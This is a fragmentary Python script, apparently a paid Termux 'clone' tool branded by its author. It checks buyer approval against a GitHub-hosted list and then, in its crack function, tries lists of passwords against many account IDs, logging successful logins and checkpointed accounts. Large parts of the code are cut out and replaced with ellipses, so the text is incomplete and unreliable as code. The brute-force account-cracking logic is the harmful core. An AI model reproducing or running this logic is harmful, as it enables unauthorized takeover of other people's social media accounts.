######DECODE BY EMon-BHai== EMON HAWLADAR ######
#always remember no system is safe##this is ramadan gift from EMON HAWLADAR https://www.facebook.com/TERGETYOURID##
...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mEMON')
...
try:
    url_proxy = random.choice([
              "https://raw.githubusercontent.com/Termux-Emon/file-and-public-clone.py/main/apr",
])
except:pass
...
def uaku():
	try:
		...
		a=requests.get('https://raw.githubusercontent.com/Termux-Emon/file-and-public-clone.py/main/apr').text
		ua=open('.Aprl.txt','w')
...
\033[38;5;46m WELCOME :  EMON HAWLADAR 
\033[38;5;46m TOOL OWNER : EMon-BHai 
\033[38;5;46m VERSION :  0.2
\033[38;5;46m STATUS :  PAID 

\033[38;5;206mCREATE  BY EMon-BHai 💙❤️💗💗🌹
\033[38;5;206mENJOY 
...
def approval():
  ...
  print ("""\033[1;37m===============================================""")
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/Termux-Emon/file-and-public-clone.py/main/apr").text
    if id in httpCaht:
      ...
      os.system('xdg-open https://wa.me/+8801309991724')
      time.sleep(1)
      sys.exit()
  except: 
    sys.exit() 
...
def login_lagi334():
	try:
		...
		sawrojj('\x1b[1;92m [EMon-BHai] LOGIN DONE.........RUN AGAIN!!!!')
		exit()
	except Exception as e:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r [EMON] {P}{loop}{P}/{P}{len(id)}{P} OK{P}={H}{ok}{P} {'{:.0%}'.format(loop/float(len(id)))}{P} "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[38;5;206m [EMon-BHai-CP] {idf}  {pw} {N}')     
